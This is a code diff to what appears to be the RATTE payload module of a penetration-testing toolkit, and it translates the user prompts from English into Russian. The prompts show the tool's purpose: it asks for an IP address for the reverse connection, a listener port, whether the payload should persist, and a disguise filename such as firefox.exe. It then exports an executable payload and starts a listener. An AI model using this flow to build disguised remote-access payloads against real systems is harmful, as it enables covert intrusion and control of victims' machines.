@@ -29,7 +29,7 @@ def ratte_listener_start(port):
 
 
 def prepare_ratte(ipaddr, ratteport, persistent, customexe):
-    core.print_info("preparing RATTE...")
+    core.print_info("готовит РАТТЕ ...")
     # replace ipaddress with one that we need for reverse connection back
     ############
     # Load content of RATTE
@@ -69,11 +69,11 @@ def main():
     #################
     # ipaddr=input(setprompt(["9", "2"], "IP address to connect back on"))
     while valid_ip != True and input_counter < 3:
-        ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
+        ipaddr = input(core.setprompt(["9", "2"], "Введите IP-адрес для подключения"))
         valid_ip = core.validate_ip(ipaddr)
         if not valid_ip:
             if input_counter == 2:
-                core.print_error("\nMaybe you have the address written down wrong?")
+                core.print_error("\nМожет быть, вы неправильно написали адрес?")
                 sleep(4)
                 return
             else:
@@ -88,13 +88,13 @@ def main():
     #         ratteport=8080
 
     try:
-        ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
+        ratteport = int(input(core.setprompt(["9", "2"], "Порт RATTE Server должен прослушивать [8080]")))
         while ratteport == 0 or ratteport > 65535:
             if ratteport == 0:
                 core.print_warning(text.PORT_NOT_ZERO)
             if ratteport > 65535:
                 core.print_warning(text.PORT_TOO_HIGH)
-            ratteport = int(input(core.setprompt(["9", "2"], "Enter port RATTE Server should listen on [8080]")))
+            ratteport = int(input(core.setprompt(["9", "2"], "Введите порт RATTE Сервер должен прослушивать [8080]")))
     except ValueError:
         # core.print_info("Port set to default of 8080")
         ratteport = 8080
@@ -106,7 +106,7 @@ def main():
     #         persistent='YES'
 
     while not valid_response:
-        persistent = input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
+        persistent = input(core.setprompt(["9", "2"], "Должен ли RATTE быть постоянным [no|yes]?"))
         persistent = str.lower(persistent)
         if persistent == "no" or persistent == "n":
             persistent = "NO"
@@ -119,14 +119,14 @@ def main():
 
     valid_response = False
 
-    customexe = input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))
+    customexe = input(core.setprompt(["9", "2"], "Используйте конкретное имя файла (например, firefox.exe) [filename.exe или пусто]?"))
 
     ############
     # prepare RATTE
     ############
     prepare_ratte(ipaddr, ratteport, persistent, customexe)
 
-    core.print_status("Payload has been exported to %s" % os.path.join(core.userconfigpath, "ratteM.exe"))
+    core.print_status("Полезная нагрузка была экспортирована в %s" % os.path.join(core.userconfigpath, "ratteM.exe"))
 
     ###################
     # start ratteserver
@@ -137,7 +137,7 @@ def main():
     #         ratte_listener_start(ratteport)
 
     while not valid_response:
-        prompt = input(core.setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
+        prompt = input(core.setprompt(["9", "2"], "Запустите слушатель ratteserver сейчас [yes|no]"))
         prompt = str.lower(prompt)
         if prompt == "no" or prompt == "n":
             # prompt = "NO"
@@ -145,10 +145,10 @@ def main():
             sleep(2)
             valid_response = True
         elif prompt == "yes" or prompt == "y":
-            core.print_info("Starting ratteserver...")
+            core.print_info("Старт ратсервер...")
             ratte_listener_start(ratteport)
-            core.print_info("Stopping ratteserver...")
+            core.print_info("Остановка ратсервера...")
             sleep(2)
             valid_response = True
         else:
-            core.print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
+            core.print_warning("действительные ответы 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
